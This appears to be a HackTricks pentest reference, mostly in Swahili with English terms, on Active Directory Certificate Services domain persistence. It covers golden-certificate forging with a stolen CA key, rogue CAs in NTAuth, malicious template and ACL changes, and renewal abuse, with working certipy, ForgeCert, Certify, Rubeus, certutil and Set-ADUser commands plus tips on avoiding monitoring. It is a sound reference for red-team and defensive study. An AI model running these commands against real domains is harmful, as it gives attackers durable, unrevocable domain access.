# AD CS Domain Persistence

{{#include ../../../banners/hacktricks-training.md}}

**Hii ni muhtasari wa mbinu za domain persistence zilizoshirikiwa katika [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf). Angalia kwa maelezo zaidi.**

## Forging Certificates with Stolen CA Certificates (Golden Certificate) - DPERSIST1

Unaweza vipi kubaini kwamba certificate ni CA certificate?

Inaweza kubainika kwamba certificate ni CA certificate ikiwa vigezo vifuatavyo vinatimizwa:

- The certificate is stored on the CA server, with its private key secured by the machine's DPAPI, or by hardware such as a TPM/HSM if the operating system supports it.
- Both the Issuer and Subject fields of the certificate match the distinguished name of the CA.
- A "CA Version" extension is present in the CA certificates exclusively.
- The certificate lacks Extended Key Usage (EKU) fields.

Ili kutoa private key ya certificate hii, zana ya `certsrv.msc` kwenye CA server ndiyo njia inayotumika kupitia GUI iliyojengwa. Hata hivyo, certificate hii haijatofautiana na nyingine zilizohifadhiwa katika mfumo; kwa hivyo, mbinu kama [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) zinaweza kutumika kwa kutoa.

The certificate and private key can also be obtained using Certipy with the following command:
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
Baada ya kupata cheti cha CA na ufunguo wake wa kibinafsi katika muundo wa `.pfx`, zana kama [ForgeCert](https://github.com/GhostPack/ForgeCert) zinaweza kutumika kuunda vyeti halali:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> Mtumiaji anayelengwa kwa certificate forgery lazima awe hai na awe na uwezo wa kuthibitisha utambulisho kwenye Active Directory ili mchakato ufanikiwe. Kuforgia certificate kwa akaunti maalum kama krbtgt haina ufanisi.

Certificate iliyoforgwa hii itakuwa **halali** hadi tarehe ya mwisho iliyotajwa na kwa **muda ambao root CA certificate itakapokuwa halali** (kwa kawaida kutoka miaka 5 hadi **10+ miaka**). Pia ni halali kwa **machines**, hivyo ikichanganywa na **S4U2Self**, mshambuliaji anaweza **maintain persistence on any domain machine** kwa muda wote root CA certificate itakapokuwa halali.\
Zaidi ya hayo, the **certificates generated** kwa njia hii **cannot be revoked** kwani CA haijui kuhusu hizo.

### Operating under Strong Certificate Mapping Enforcement (2025+)

Since February 11, 2025 (after KB5014754 rollout), domain controllers default to **Full Enforcement** for certificate mappings. Kivitendo hili inamaanisha forged certificates zako lazima ziwe moja ya zifuatazo:

- Ziwe na binding thabiti kwa akaunti lengwa (kwa mfano, SID security extension), au
- Ziwe zimeoanisha na mapping thabiti, wazi kwenye sifa ya kitu lengwa `altSecurityIdentities`.

Mbinu ya kuaminika kwa persistence ni kutengeneza forged certificate iliyounganishwa (chained) na Enterprise CA iliyoporwa, kisha kuongeza mapping thabiti, wazi kwenye victim principal:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Vidokezo
- Ikiwa unaweza kutengeneza vyeti bandia vinavyojumuisha ugani wa usalama wa SID, vitatafsiriwa kwa kimyakimya hata chini ya Full Enforcement. Vinginevyo, pendelea ramani wazi, thabiti. Angalia [account-persistence](account-persistence.md) kwa zaidi kuhusu ramani wazi.
- Kusitishwa hakusaidii walinda hapa: vyeti bandia havijulikani kwa hifadhidata ya CA na kwa hivyo haviwezi kusitishwa.

#### Full-Enforcement compatible forging (SID-aware)

Zana zilizosasishwa zinawezesha kuingiza SID moja kwa moja, zikifanya golden certificates ziweze kutumika hata wakati DCs zinakataa weak mappings:
```bash
# Certify 2.0 integrates ForgeCert and can embed SID
Certify.exe forge --ca-pfx CORP-DC-CA.pfx --ca-pass Password123! \
--upn administrator@corp.local --sid S-1-5-21-1111111111-2222222222-3333333333-500 \
--outfile administrator_sid.pfx

# Certipy also supports SID in forged certs
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local \
-sid S-1-5-21-1111111111-2222222222-3333333333-500 -out administrator_sid.pfx
```
Kwa kuingiza SID ndani, unakwepa kuhitaji kugusa `altSecurityIdentities`, ambayo inaweza kufuatiliwa, huku bado ukitimiza ukaguzi thabiti wa ulinganifu.

## Trusting Rogue CA Certificates - DPERSIST2

Object ya `NTAuthCertificates` imefafanuliwa kuwa ina moja au zaidi ya **CA certificates** ndani ya sifa yake ya `cacertificate`, ambayo Active Directory (AD) inaitumia. Mchakato wa uthibitisho unaofanywa na **domain controller** unahusisha kukagua object ya `NTAuthCertificates` kwa kipengele kinacholingana na **CA specified** katika uwanja wa Issuer wa **certificate** inayothibitisha. Uthibitisho unaendelea ikiwa patakana ulinganifu.

Cheti cha CA kilichojiandika mwenyewe kinaweza kuongezwa kwenye object ya `NTAuthCertificates` na mshambuliaji, mradi ana udhibiti juu ya object hii ya AD. Kawaida, ni wanachama wa kikundi cha **Enterprise Admin**, pamoja na **Domain Admins** au **Administrators** katika **forest root’s domain**, waliokabidhiwa ruhusa ya kubadilisha object hii. Wanaweza kuhariri object ya `NTAuthCertificates` kwa kutumia `certutil.exe` kwa amri `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA`, au kwa kutumia [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool).

Amri za ziada zinazosaidia kwa mbinu hii:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
Hii uwezo ni muhimu hasa inapotumika pamoja na njia iliyotanguliwa inayohusisha ForgeCert kuunda vyeti kwa nguvu kwa njia ya dynamic.

> Mawazo ya ramani baada ya 2025: kuweka rogue CA ndani ya NTAuth kunainisha tu kuaminiwa kwa CA inayotoa. Ili kutumia vyeti vya leaf kwa logon wakati DCs ziko katika **Full Enforcement**, leaf lazima iwe na ugani wa usalama wa SID au lazima kuwe na ulinganifu wa wazi na thabiti kwenye kitu lengwa (kwa mfano, Issuer+Serial katika `altSecurityIdentities`). Angalia {{#ref}}account-persistence.md{{#endref}}.

## Malicious Misconfiguration - DPERSIST3

Fursa za **persistence** kupitia **mabadiliko ya security descriptor ya vipengele vya AD CS** zipo nyingi. Mabadiliko yaliyotajwa katika sehemu ya "[Domain Escalation](domain-escalation.md)" yanaweza kutekelezwa kwa nia mbaya na mshambuliaji mwenye upatikanaji wa ruhusa za juu. Hii inajumuisha kuongeza "control rights" (mfano, WriteOwner/WriteDACL/etc.) kwa vipengele nyeti kama:

- Kituo cha **CA server’s AD computer** object
- Kituo cha **CA server’s RPC/DCOM server**
- Kila **descendant AD object or container** ndani ya **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (kwa mfano, Certificate Templates container, Certification Authorities container, the NTAuthCertificates object, n.k.)
- **AD groups delegated rights to control AD CS** kwa default au kwa shirika (kama kundi la built-in Cert Publishers na wanachama wake)

Mfano wa utekelezaji wa dhambi ungehusisha mshambuliaji aliye na **ruhusa za juu** kwenye domaine, akiweka ruhusa ya **`WriteOwner`** kwenye template ya cheti ya default ya **`User`**, akiwa mshirika wa haki hiyo. Ili kuinufaika, mshambuliaji angebadilisha umilikaji (ownership) wa template ya **`User`** kuwa kwake. Baada ya hapo, **`mspki-certificate-name-flag`** ungewekwa kuwa **1** kwenye template ili kuwezesha **`ENROLLEE_SUPPLIES_SUBJECT`**, ikiruhusu mtumiaji kutoa Subject Alternative Name katika ombi. Hivi karibuni, mshambuliaji angeweza **enroll** akitumia **template**, akichagua jina la **domain administrator** kama jina mbadala, na kutumia cheti kilichopatikana kwa uthibitisho kama DA.

Vigezo vitakavyowekwa na washambuliaji kwa kudumu ndani ya domaine (angalia {{#ref}}domain-escalation.md{{#endref}} kwa maelezo kamili na utambuzi):

- bendera za sera za CA zinazoruhusu SAN kutoka kwa waombi (mfano, kuwezesha `EDITF_ATTRIBUTESUBJECTALTNAME2`). Hii inafanya njia kama ESC1 zikaendelea kuwa zenye kuwika.
- DACL za template au mipangilio inayoruhusu utoaji unaoweza kutumika kwa uthibitisho (mfano, kuongeza Client Authentication EKU, kuwezesha `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Kudhibiti kituo cha `NTAuthCertificates` au makontena ya CA ili kuendelea kuingiza tena waotoaji haribifu ikiwa walinzi wanajaribu kusafisha.

> [!TIP]
> Katika mazingira yaliyoimarishwa baada ya KB5014754, kupakana makosa haya ya usanidi na ulinganifu thabiti unaoonekana (`altSecurityIdentities`) kunahakikisha vyeti ulivyotoa au kughushi vinabaki vitumike hata wakati DCs zinatunga ulinganifu thabiti.

### Certificate renewal abuse (ESC14) for persistence

Ikiwa utachomoa cheti chenye uwezo wa uthibitisho (au cheti cha Enrollment Agent), unaweza **kuukarabati (renew) bila kikomo** mradi template inayotoa bado imechapishwa na CA yako bado inaamini mnyororo wa muuzaji. Renewal inahifadhi vifungo vya utambulisho vya awali lakini inaongeza uhalali, na kufanya uondoaji (eviction) kuwa mgumu isipokuwa template itatengenezwa au CA ichapishwe tena.
```bash
# Renew a stolen user cert to extend validity
certipy req -ca CORP-DC-CA -template User -pfx stolen_user.pfx -renew -out user_renewed_2026.pfx

# Renew an on-behalf-of cert issued via an Enrollment Agent
certipy req -ca CORP-DC-CA -on-behalf-of 'CORP/victim' -pfx agent.pfx -renew -out victim_renewed.pfx
```
Ikiwa domain controllers ziko katika **Utekelezaji Kamili**, ongeza `-sid <victim SID>` (au tumia template ambayo bado inajumuisha SID security extension) ili renewed leaf certificate iendelee kubaki na ulinganifu thabiti bila kugusa `altSecurityIdentities`. Wavamizi walio na CA admin rights wanaweza pia kubadilisha `policy\RenewalValidityPeriodUnits` ili kupanua muda wa uhalali wa certificates zilizorekebishwa kabla ya kujitoa wenyewe cert.

## Marejeo

- [Microsoft KB5014754 – Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings)](https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [Certipy – Command Reference and forge/auth usage](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [SpecterOps – Certify 2.0 (integrated forge with SID support)](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [ESC14 renewal abuse overview](https://www.adcs-security.com/attacks/esc14)
- [0xdf – HTB: Certificate (SeManageVolumePrivilege to exfil CA keys → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../../banners/hacktricks-training.md}}
